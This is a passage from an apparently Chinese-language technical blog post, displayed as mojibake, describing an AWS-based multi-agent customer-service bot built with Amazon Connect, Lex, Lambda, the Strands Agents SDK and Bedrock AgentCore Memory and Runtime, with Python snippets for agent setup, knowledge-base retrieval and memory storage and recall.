<p>Memory æ¨¡å—åœ¨æ¶æ„ä¸Šé‡‡ç”¨åˆ†å±‚å­˜å‚¨ç­–ç•¥ï¼šçŸ­æœŸè®°å¿†å±‚å­˜å‚¨åŸå§‹äº¤äº’äº‹ä»¶ä½œä¸ºå³æ—¶ä¸Šä¸‹æ–‡ï¼Œé•¿æœŸè®°å¿†å±‚å­˜å‚¨ä»äº‹ä»¶æå–çš„æ¦‚è¦çŸ¥è¯†ã€‚Memory æœåŠ¡èƒŒåå®ç°äº†è‡ªåŠ¨çš„ä¿¡æ¯å¤„ç†æµæ°´çº¿ï¼šå½“æ–°çš„äº‹ä»¶è¢«å­˜å‚¨æ—¶ï¼Œå¦‚æœ Memory é…ç½®äº†é•¿æœŸè®°å¿†ç­–ç•¥ï¼ŒæœåŠ¡ä¼šå¼‚æ­¥åœ°å¯¹äº‹ä»¶å†…å®¹è¿›è¡Œåˆ†æï¼ˆä¾‹å¦‚è°ƒç”¨åŸºç¡€æ¨¡å‹ï¼‰æ¥æç‚¼å‡ºå¯é•¿æœŸä¿å­˜çš„çŸ¥è¯†ç‰‡æ®µã€‚</p>
<p>æ‰€æœ‰æ•°æ®ç”±äºšé©¬é€Šäº‘ç§‘æŠ€ä»¥ åŠ å¯† æ–¹å¼å­˜å‚¨ï¼Œå¹¶ä½¿ç”¨å‘½åç©ºé—´ï¼ˆnamespaceï¼‰è¿›è¡Œéš”ç¦»åˆ†åŒºï¼Œç¡®ä¿ä¸åŒåº”ç”¨æˆ–ç”¨æˆ·çš„è®°å¿†æ•°æ®å½¼æ­¤åˆ†éš”ã€‚è¿™ä¸€å®Œå…¨æ‰˜ç®¡çš„è®°å¿†åŸºç¡€è®¾æ–½è®©å¼€å‘è€…æ— éœ€è‡ªå·±æ­å»ºæ•°æ®åº“æˆ–å‘é‡å­˜å‚¨ï¼Œå°±èƒ½æ–¹ä¾¿åœ°è®© Agent æ‹¥æœ‰è®°å¿†åŠŸèƒ½ã€‚</p>
<p>å¦‚å›¾3æ‰€ç¤ºæ˜¯æœ¬æ¬¡å®è·µé‡‡ç”¨AgentCore Memoryï¼Œå¹¶å……åˆ†åˆ©ç”¨äº†é•¿æœŸè®°å¿†ï¼Œå¦‚æ‘˜è¦ä¿¡æ¯æ¥ç®€åŒ–å®¢æœè½¬åå¸­çš„æ€»ç»“åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å®ç°è‡ªåŠ¨è¯­ä¹‰è¯†åˆ«æ¥æå–ä¿¡æ¯å†™å…¥CRMç³»ç»Ÿï¼Œè¯¦ç»†å‚åŠ å›¾3ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75143156e96546bdbf58945c8c6d9e8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=K4Fe%2F5hLNGKfFgzCaCJ8n8iYpUM%3D" alt="3.webp" loading="lazy"/></p>
<p align="center">å›¾3 AgentCore MemoryåŠŸèƒ½</p>
<h3 data-id="heading-15">3.4 Agentæ¡†æ¶åŠè¿è¡Œè§£æ</h3>
<p>æœ¬æ¬¡å®è·µé‡‡ç”¨Standsæ¡†æ¶æ¥å®ç°äº†å…·ä½“Agentã€‚å¹¶å’ŒBenrock AgentCore Runtimeç»“åˆï¼Œæ¯æ¬¡è°ƒç”¨Agentå°±æ˜¯å¯åŠ¨ä¸€æ¬¡Bedrock AgentCore Runtimeã€‚</p>
<p>Bedrocl AgentCore Runtime æ˜¯ä¸€æ¬¾é«˜åº¦å®‰å…¨ã€å¼¹æ€§ã€é«˜æ•ˆèƒ½çš„ Serverless Agent æ‰˜ç®¡å¹³å°ï¼Œå®ƒè®©ä¼ä¸šæ— éœ€ä¸ºåŸºç¡€è®¾æ–½çƒ¦æ¼ï¼Œå³å¯ä¸“æ³¨ Agent ä¸šåŠ¡å¼€å‘ï¼Œå¹¶æ»¡è¶³ç”Ÿäº§çº§å®‰å…¨ã€æˆæœ¬å’Œå¯æ‰©å±•æ€§éœ€æ±‚ã€‚æ”¯æŒå¤šæ­¥é€»è¾‘å’Œå¼‚æ­¥ä»»åŠ¡æ‰§è¡Œï¼ŒRuntime å¯ä¿æŒä¼šè¯çŠ¶æ€é•¿è¾¾ 8 å°æ—¶ï¼Œé€‚åˆå¤æ‚æ¨ç†å’Œé•¿æµç¨‹ä»»åŠ¡ï¼Œé‡‡ç”¨æŒ‰å®é™…è®¡ç®—èµ„æºä½¿ç”¨è®¡è´¹æ–¹å¼ï¼Œè®¡ç®—åªæœ‰åœ¨ Agent çœŸæ­£æ‰§è¡Œæ—¶æ‰è®¡è´¹ï¼ŒèŠ‚çœå¤§é‡å› ç­‰å¾…å¤–éƒ¨ LLM æˆ– API çš„ç©ºé—²æ—¶é—´è´¹ç”¨ï¼Œéå¸¸é€‚åˆå®¢æœåº”ç”¨åœºæ™¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/509adab9e4d043a197311c825588d24d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=d2sDzJQRWe%2BMraIEHLBxngxaN2w%3D" alt="4.webp" loading="lazy"/></p>
<h3 data-id="heading-16">3.5 Amazon Connect ContentFlowè°ƒç”¨Lambdaçš„æœ€ä½³å®è·µ</h3>
<p>åœ¨Amazon Connect ContentFlowä¸­è°ƒç”¨Lambdaå®ç°å’Œå¤–éƒ¨ç³»ç»Ÿé›†æˆæ—¶å¦‚æœé‡‡ç”¨åŒæ­¥æ¨¡å¼ï¼ŒLambdaæœ€å¤§æ‰§è¡Œè¶…æ—¶æ—¶é—´æ˜¯8ç§’ï¼Œè¿™ä¸ªç°åœ¨åœ¨è°ƒç”¨å¤§è¯­è¨€æ¨¡å‹æ—¶å¦‚æœä»»åŠ¡æ¯”è¾ƒå¤æ‚ï¼Œæ‰§è¡Œä¼šè¶…è¿‡8ç§’ï¼Œè¿™ä¼šå¯¼è‡´è¿™ä¸ªæµç¨‹æŠ¥é”™ã€‚ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥é‡‡ç”¨æœ€æ–°çš„å¼‚æ­¥è°ƒç”¨æ¨¡å¼ï¼Œè¿™ä¸ªå¯ä»¥å°†æœ€å¤§æ‰§è¡Œæ—¶é—´å»¶é•¿åˆ°60ç§’ï¼Œè‚¯å®šå¯ä»¥æ»¡è¶³è¦æ±‚ã€‚å…·ä½“è°ƒç”¨æ–¹æ³•å‚åŠ ä¸‹å›¾ã€‚å…ˆåœ¨Amazon Lambda Functionè°ƒç”¨æ—¶å€™é€‰æ‹©å¼‚æ­¥æ¨¡å¼ï¼Œç„¶åè®¾ç½®WaitèŠ‚ç‚¹ç­‰å¾…æ‰§è¡Œå®Œæˆï¼Œæ‰§è¡Œå®Œæˆåå†æ¬¡è°ƒç”¨Amazon Lambda FunctionèŠ‚ç‚¹ï¼Œå¹¶é€‰æ‹©Load Lambda Resultæ¥è·å–æ‰§è¡Œç»“æœã€‚è¿™æ ·å¯ä»¥è§£å†³è¶…æ—¶ç“¶é¢ˆé—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65a4107604e84e718ba123f2d8ce563f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=HAo7T4%2B7R%2Fok8NHZ6e8unFgJ%2Fyg%3D" alt="5.webp" loading="lazy"/></p>
<h2 data-id="heading-17">4. å…·ä½“ä»£ç å®ç°åŠéƒ¨ç½²è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-18"><strong>4.1</strong> <strong>æœ¬æ¬¡å®è·µå®¢æˆ·åœºæ™¯æè¿°</strong></h3>
<ul>
<li>æœ¬æ¬¡å®è·µä»¥åˆ¶é€ ä¸šæµ·å¤–å”®åæœåŠ¡ä¸ºèƒŒæ™¯ï¼Œé€šè¿‡æ™ºèƒ½å®¢æœæ¥å®ç°äº§å“å”®åæœåŠ¡å’¨è¯¢ï¼Œè®¢å•æŸ¥è¯¢ï¼Œè‡ªåŠ¨é€€è´§ç­‰å®é™…åœºæ™¯ï¼Œå¦‚æœé—®é¢˜å¤æ‚æ— æ³•é€šè¿‡è‡ªåŠ©æœåŠ¡è§£å†³å°†è‡ªåŠ¨è½¬æ¥äººå·¥åå¸­ã€‚</li>
<li>æ™ºèƒ½å®¢æœç»Ÿä¸€é‡‡ç”¨åŸºäºStandsæ¡†æ¶çš„Multi Agentæ¶æ„ï¼Œå°†æ„å›¾è¯†åˆ«ï¼ŒçŸ¥è¯†åº“è°ƒç”¨ï¼Œå·¥å…·è°ƒç”¨ç»Ÿä¸€å°è£…ä¸ºå„ç§AgentæœåŠ¡ï¼Œå¯ä»¥å®ç°ç®€å•æ™ºèƒ½è°ƒç”¨ã€‚</li>
</ul>
<h3 data-id="heading-19"><strong>4.2Amazon Connect</strong> <strong>ä¸šåŠ¡æµå®ç°ï¼š</strong></h3>
<ul>
<li>
<p>åˆ©ç”¨Connect Content Flowæ¥å®ç°æ•´ä¸ªä¸šåŠ¡åœºæ™¯ã€‚</p>
</li>
<li>
<p>é€šè¿‡Lexæ¥è·å–ç”¨æˆ·è¾“å…¥ï¼Œæ”¯æŒè¯­éŸ³å’ŒChatä¸¤ä¸ªæ¸ é“ã€‚</p>
</li>
<li>
<p>Connect Content Flowé€šè¿‡å¼‚æ­¥è°ƒç”¨Lambdaå®ç°æ™ºèƒ½Agentçš„è°ƒç”¨ï¼Œå¹¶è¿”å›æœ€ä½³å›å¤ç»™åˆ°å®¢æˆ·ï¼Œæ•´ä¸ªè¿‡ç¨‹æ”¯æŒå¤šè½®å¯¹è¯å’Œå¤šä¸šåŠ¡å¤„ç†ã€‚</p>
</li>
<li>
<p>å½“Agentè¿”å›ç»“åˆå‘ŠçŸ¥è¯¥æœåŠ¡éœ€è¦äººå·¥åå¸­æ¥å…¥åˆ™ç³»ç»Ÿè‡ªåŠ¨è½¬äººå·¥åå¸­å¹¶æä¾›è‡ªåŠ¨æœåŠ¡çš„å…¨ç¨‹å¯¹è¯æ‘˜è¦ï¼Œé¿å…åå¸­é‡å¤è¯¢é—®ä¹‹å‰çš„é—®é¢˜ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c7f734fdcb949958b1b7e67b29993eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=%2FSy%2Fx%2FNHq0M5OR3W8Wb%2B9NfJ2aw%3D" alt="6.webp" loading="lazy"/></p>
<h3 data-id="heading-20"><strong>4.3 Stands Agent</strong> <strong>åŠBedrock AgentCore Runtimeéƒ¨ç½²åŠå®ç°ï¼š</strong></h3>
<ul>
<li>
<p>Strands Agents SDK æ˜¯ç”±äºšé©¬é€Šäº‘ç§‘æŠ€å¼€æºçš„Agentè½¯ä»¶å¼€å‘å·¥å…·åŒ…ï¼Œå®ƒé‡‡ç”¨æ¨¡å‹é©±åŠ¨çš„æ–¹å¼ï¼Œæ—¨åœ¨ç®€åŒ–å’ŒåŠ é€Ÿ AI æ™ºèƒ½ä½“çš„æ„å»ºä¸éƒ¨ç½²ã€‚å®ƒçš„ä¸»è¦ä¼˜åŠ¿ï¼š</p>
<ul>
<li>å¼€å‘æµç¨‹ç®€åŒ–ï¼šå¼€å‘è€…åªéœ€å®šä¹‰æ ¸å¿ƒçš„æç¤ºè¯ï¼ˆPromptï¼‰å’Œå¯ç”¨çš„å·¥å…·åˆ—è¡¨ï¼Œè€Œæ— éœ€ç¼–å†™å¤æ‚çš„å·¥ä½œæµä»£ç ã€‚æå¤§é™ä½äº†å¼€å‘æˆæœ¬ï¼ŒåŠ å¿«ä¸Šçº¿é€Ÿåº¦ã€‚</li>
<li>å¹¿æ³›çš„ç”Ÿæ€æ”¯æŒï¼šSDK å…·æœ‰é«˜åº¦çš„å¼€æ”¾æ€§å’Œå…¼å®¹æ€§ï¼Œæ”¯æŒåŒ…æ‹¬ Amazon Bedrockã€OpenAIã€Ollama ç­‰åœ¨å†…çš„å¤šç§å¤§å‹è¯­è¨€æ¨¡å‹ã€‚å¹¶ä¸”ï¼Œé¢„ç½®äº†æ–‡ä»¶ç®¡ç†ã€ä»£ç æ‰§è¡Œã€ç½‘ç»œè¯·æ±‚ç­‰å¤šç§å®ç”¨å·¥å…·ï¼Œå¼€ç®±å³ç”¨ã€‚</li>
<li>æ”¯æŒå¤šæ™ºèƒ½ä½“ç¼–æ’ï¼šè¯¥ SDK å¼•å…¥äº†å…ˆè¿›çš„ Swarm æ¶æ„ï¼Œæ”¯æŒå¤šæ™ºèƒ½ä½“å¹¶å‘å¤„ç†å’ŒååŒå·¥ä½œã€‚è¿™å¯¹äºå¤„ç†å¤æ‚ä»»åŠ¡ã€æå‡å¤„ç†æ•ˆç‡å’Œå‡†ç¡®ç‡è‡³å…³é‡è¦ã€‚</li>
</ul>
</li>
<li>
<p>åœ¨æœ¬æ¬¡çš„æ™ºèƒ½å®¢æœæœºå™¨äººçš„å®è·µä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨äº†å¦‚ä¸‹çš„å¤šAgentç¼–æ’çš„æ¶æ„ï¼Œè®©è´Ÿè´£çš„å®¢æœä»»åŠ¡èƒ½å¤Ÿæ›´ç²¾ç¡®æœ‰æ•ˆçš„æ‰§è¡Œã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dea59b64cc9432ab73b30630834e295~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=77Z%2BfOdAuADcsbXHogeKEblK9%2Fo%3D" alt="7.webp" loading="lazy"/></p>
<ul>
<li>
<p>Strands SDK å¤šAgentçš„å…³é”®ä»£ç å®ç°ï¼š</p>
<ul>
<li>æ€»æ§Agentçš„ä»£ç å®ç°ï¼š</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-Python" lang="Python">      bedrock_model = BedrockModel(
            model_id=<span class="hljs-string">"global.anthropic.claude-sonnet-4-20250514-v1:0"</span>,
            temperature=<span class="hljs-number">0.3</span>,
            top_p=<span class="hljs-number">0.8</span>,
        )

        <span class="hljs-comment"># Create the supervisor agent with all specialist Agents</span>
        self.current_agent = Agent(
            name=<span class="hljs-string">"Supervisor Agent"</span>,
            system_prompt=self._build_system_prompt(),
            model=bedrock_model,
            state={<span class="hljs-string">"session_id"</span>: session_id},
            tools=[
                update_user_id,
                get_product_usage,
                start_return_process,
                check_order_status,
            ],
        )
</code></pre>
<ul>
<li>å­Agentçš„ä»£ç å®ç°ï¼š</li>
</ul>
<pre><code class="hljs language-Python" lang="Python"><span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">retrieve_from_kb</span>(<span class="hljs-params">query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
    <span class="hljs-string">"""
    Retrieve information from a knowledge base based on a query.
    Args:
        query: The search query
    Returns:
        Dictionary containing retrieval results
    """</span>

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># Call the retrieve tool directly</span>
        retrieve_response = retrieve.retrieve(
            {
                <span class="hljs-string">"toolUseId"</span>: <span class="hljs-built_in">str</span>(uuid.uuid4()),
                <span class="hljs-string">"input"</span>: {
                    <span class="hljs-string">"text"</span>: query,
                    <span class="hljs-string">"score"</span>: MIN_RELEVANCE_SCORE,
                    <span class="hljs-string">"numberOfResults"</span>: MAX_RAG_RESULTS,
                    <span class="hljs-string">"knowledgeBaseId"</span>: DEFAULT_KNOWLEDGE_BASE_ID,
                    <span class="hljs-string">"region"</span>: AWS_REGION,
                   
                },
            }
        )
        logger.info(<span class="hljs-string">f"retrieve_response: <span class="hljs-subst">{retrieve_response}</span>"</span>)
        <span class="hljs-keyword">return</span> retrieve_response
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"Error details: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">raise</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">"status"</span>: <span class="hljs-string">"error"</span>,
            <span class="hljs-string">"message"</span>: <span class="hljs-string">f"Error retrieving from knowledge base: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>,
        }


<span class="hljs-keyword">def</span> <span class="hljs-title function_">init_agent</span>(<span class="hljs-params">agent_name: <span class="hljs-built_in">str</span></span>) -&gt; Agent:
    <span class="hljs-keyword">return</span> Agent(
        name=agent_name,
        system_prompt=faq_agent_system_prompt,
        model=bedrock_model,
        tools=[retrieve_from_kb, check_order_status],
    )
</code></pre>
<h3 data-id="heading-21"><strong>4.4 Bedrock AgentCore Memory</strong> <strong>è°ƒç”¨å®ç°ï¼š</strong></h3>
<ul>
<li>Amazon Bedrock AgentCoreÂ æ˜¯ä¸€ä¸ªç”±äºšé©¬é€Šäº‘ç§‘æŠ€æ¨å‡ºçš„å…¨æ‰˜ç®¡ã€æ¨¡å—åŒ–å¹³å°ï¼Œæ—¨åœ¨å¸®åŠ©å¼€å‘è€…å¤§è§„æ¨¡æ„å»ºã€éƒ¨ç½²å’Œè¿è¥å®‰å…¨å¯é çš„ AI Agentã€‚å…¶ä¸­ï¼ŒMemoryæ˜¯ä¸ºAgentæä¾›æŒä¹…åŒ–çš„çŸ­æœŸå’Œé•¿æœŸè®°å¿†èƒ½åŠ›ï¼Œä»¥ç»´æŠ¤å¯¹è¯ä¸Šä¸‹æ–‡ã€‚</li>
</ul>
<p>åœ¨æœ¬å®¢æœæœºå™¨äººå®è·µä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨AgentCore Memoryçš„èƒ½åŠ›æ¥ä¿å­˜å®¢æˆ·å†å²ä¸Šçš„å¯¹è¯è®°å½•ï¼Œå¹¶å°†è¿™äº›å†å²å¯¹è¯è®°å½•ä½œä¸ºå®¢æœçš„åŸºç¡€ï¼Œæ¥æ›´å¥½çš„å›ç­”å®¢æˆ·çš„é—®é¢˜å’Œè¯‰æ±‚ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬ä»¥ä»£ç ç‰‡æ®µçš„å½¢å¼ï¼Œå°†Memoryçš„è°ƒç”¨è¿‡ç¨‹ï¼Œå±•ç¤ºç»™å¤§å®¶ã€‚</p>
<ul>
<li>
<ul>
<li>ç¬¬ä¸€æ­¥ï¼Œåˆ›å»ºmemory</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_memory</span>(<span class="hljs-params">memory_name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:

    <span class="hljs-keyword">try</span>:
        client = MemoryClient(region_name=AWS_REGION)
        memory = client.create_memory_and_wait(
            name=memory_name,
            strategies=[
                {
                    <span class="hljs-string">"userPreferenceMemoryStrategy"</span>: {
                        <span class="hljs-string">"name"</span>: <span class="hljs-string">"UserPreference"</span>,
                        <span class="hljs-string">"namespaces"</span>: [<span class="hljs-string">"/users/{actorId}"</span>],
                    }
                }
            ],
        )
        logger.info(
            <span class="hljs-string">f"Successfully created AgentCore Memory with ID: <span class="hljs-subst">{memory.get(<span class="hljs-string">'id'</span>)}</span>"</span>
        )
        logger.info(<span class="hljs-string">f"Memory details: <span class="hljs-subst">{memory}</span>"</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.info(<span class="hljs-string">f"Error creating AgentCore Memory: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<ul>
<li>
<ul>
<li>ç¬¬äºŒæ­¥ï¼Œä¿å­˜memory</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_memory</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">str</span>, message: <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]</span>) -&gt; <span class="hljs-literal">None</span>:
    params = {
        <span class="hljs-string">"memory_id"</span>: BEDROCK_AGENTCORE_MEMORY_ID,
        <span class="hljs-string">"actor_id"</span>: <span class="hljs-string">f"user_<span class="hljs-subst">{user_id}</span>"</span>,
        <span class="hljs-string">"session_id"</span>: <span class="hljs-string">f"session_user_<span class="hljs-subst">{user_id}</span>"</span>,
        <span class="hljs-string">"messages"</span>: [message],
    }

    memory_client = MemoryClient(region_name=AWS_REGION)
    memory_client.create_event(**params)
</code></pre>
<ul>
<li>
<ul>
<li>ç¬¬ä¸‰æ­¥ï¼Œåœ¨é€‚åˆçš„æµç¨‹ä¸­ï¼Œå¬å›memoryã€‚ å¬å›Memoryçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨Strands toolsï¼šAgentCoreMemoryToolProviderã€‚å¯ä»¥ä½¿ç”¨ä¸åŒçš„Queryå¬å›ä¸åŒåˆ†ç±»çš„Memoryã€‚ä½¿å¾—Memoryçš„åº”ç”¨æ›´åŠ çµæ´»å’Œç²¾å‡†ã€‚</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_agent</span>(<span class="hljs-params">agent_name: <span class="hljs-built_in">str</span>, user_id: <span class="hljs-built_in">str</span>, session_id: <span class="hljs-built_in">str</span></span>) -&gt; Agent:
    provider = AgentCoreMemoryToolProvider(
        memory_id=BEDROCK_AGENTCORE_MEMORY_ID,
        actor_id=<span class="hljs-string">f"user_<span class="hljs-subst">{user_id}</span>"</span>,
        session_id=<span class="hljs-string">f"session_user_<span class="hljs-subst">{user_id}</span>"</span>,
        namespace=<span class="hljs-string">f"/users/user_<span class="hljs-subst">{user_id}</span>"</span>,
        region=AWS_REGION,
    )
    <span class="hljs-keyword">return</span> Agent(
        name=agent_name,
        system_prompt=<span class="hljs-string">"You are a helpful assistant with memory capabilities."</span>,
        model=bedrock_model,
        tools=provider.tools,
    )

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_customer_info</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">str</span>, session_id: <span class="hljs-built_in">str</span>, query: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""
    Process and respond to the use of product related queries using a specialized return agent.

    Args:
        user_id: customer provided user id
        session_id: current chat session id, in the context model
        query: A return related question or problem from the user

    Returns:
        customer history or save the new event in custoemr memroy store
    """</span>
    <span class="hljs-comment"># Format the query for the contact agent with clear instructions</span>
    formatted_query = <span class="hljs-string">f"<span class="hljs-subst">{query}</span>"</span>

    <span class="hljs-keyword">try</span>:
        logger.info(
            <span class="hljs-string">f"Routed to memory Agent: user_id:<span class="hljs-subst">{user_id}</span>, session_id:<span class="hljs-subst">{session_id}</span>, query:<span class="hljs-subst">{query}</span>"</span>
        )
        agent = init_agent(<span class="hljs-string">"customer info agent"</span>, user_id, session_id)
        agent_response = agent(formatted_query)
        text_response = <span class="hljs-built_in">str</span>(agent_response)
        logger.info(<span class="hljs-string">f"customer info agent: <span class="hljs-subst">{text_response}</span>"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text_response) &gt; <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> text_response

        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ²¡æœ‰å…³äºè¿™ä¸ªç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ã€‚"</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># Return specific error message for shipping processing</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Error processing your return related query: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>
</code></pre>
<ul>
<li>Amazon Bedrock AgentCore Runtimeæ˜¯ä¸ºAgentæ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºæ‰˜ç®¡ AI Agentè€Œè®¾è®¡çš„åŸºç¡€è®¾æ–½ã€‚å®ƒé‡‡ç”¨å®¹å™¨åŒ–çš„éƒ¨ç½²æ–¹å¼ï¼Œè´Ÿè´£å¤„ç†ç”¨æˆ·è¾“å…¥ã€ç»´æŠ¤ä¸Šä¸‹æ–‡ï¼Œå¹¶åˆ©ç”¨å®¹å™¨çš„éš”ç¦»èƒ½åŠ›ï¼Œç»™AIåº”ç”¨ä¸€ä¸ªå®‰å…¨é«˜æ•ˆçš„è¿è¡Œç¯å¢ƒã€‚</li>
</ul>
<p>åœ¨æœ¬æ¬¡å®è·µä¸­ï¼Œæˆ‘ä»¬å¤šAgentçš„åº”ç”¨éƒ¨ç½²å¹³å°ï¼Œå°±é‡‡ç”¨äº†AgentCore Runtimeã€‚å®ƒä¿è¯äº†æˆ‘ä»¬å®¢æœèƒ½å¤ŸæŒ‰éœ€ä»˜è´¹ï¼Œä¸ç”¨ä¸ºå®¢æœçš„é—²æ—¶èŠ±è´¹åŸºç¡€èµ„æºè´¹ç”¨ï¼ŒåŒæ—¶Runtimeçš„é«˜æ‰©å±•æ€§ï¼Œä¹Ÿä¿è¯äº†æ•´ä¸ªç³»ç»Ÿå¯ä»¥åº”å¯¹çªç„¶çš„ä¸šåŠ¡é«˜å³°å†²å‡»ã€‚ æˆ‘ä»¬å®¢æœæœºå™¨äººçš„ä¸šåŠ¡è°ƒç”¨æµå¦‚ä¸‹: Connect æœåŠ¡ä¸ºå®¢æœæœºå™¨äººç³»ç»Ÿçš„æ¥å…¥æ¨¡å—ï¼Œè´Ÿè´£chatæˆ–voiceæ•°æ®çš„æµå…¥ï¼ŒLexä¸ºå®¢æœé€»è¾‘æ¨¡å—ï¼Œè´Ÿè´£æ„å›¾è¯†åˆ«å’Œç³»ç»Ÿè°ƒåº¦ï¼ŒLexå¯ä»¥é€šè¿‡Lambdaè°ƒç”¨éƒ¨ç½²åœ¨AgentCore Runtimeä¸Šçš„å¤šAgentå®¢æœç³»ç»Ÿï¼Œè‡ªåŠ¨å¤„ç†å®¢æˆ·é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cadb127e9b5448d4b5156610e2877a68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=T%2BoZSZV06E88WgNfGTkz%2FVUhlO8%3D" alt="d1da8719cc164f1ff18d9cbbea0c9052.png" loading="lazy"/></p>
<ul>
<li>AgentCore Runtimeæœ‰2ç§éƒ¨ç½²æ–¹å¼ï¼Œæœ¬æ–‡ä½¿ç”¨çš„æ˜¯å¯å®šåˆ¶åŒ–ç¨‹åº¦æ›´é«˜çš„è‡ªå»ºDocker imageï¼Œä¸Šä¼ ECRçš„éƒ¨ç½²å½¢å¼ã€‚å…·ä½“çš„æ“ä½œæµç¨‹å¯ä»¥å‚è§é™„ä»¶æ‰€åˆ—çš„æ–‡æ¡£ã€‚</li>
</ul>
<h2 data-id="heading-22">5. é™„å½•</h2>
<p>Github codeï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fheqiqi%2Fmulti-agent-for-customer-support" target="_blank" title="https://github.com/heqiqi/multi-agent-for-customer-support" ref="nofollow noopener noreferrer">github.com/heqiqi/multâ€¦</a></p>
<h2 data-id="heading-23">6. æ€»ç»“</h2>
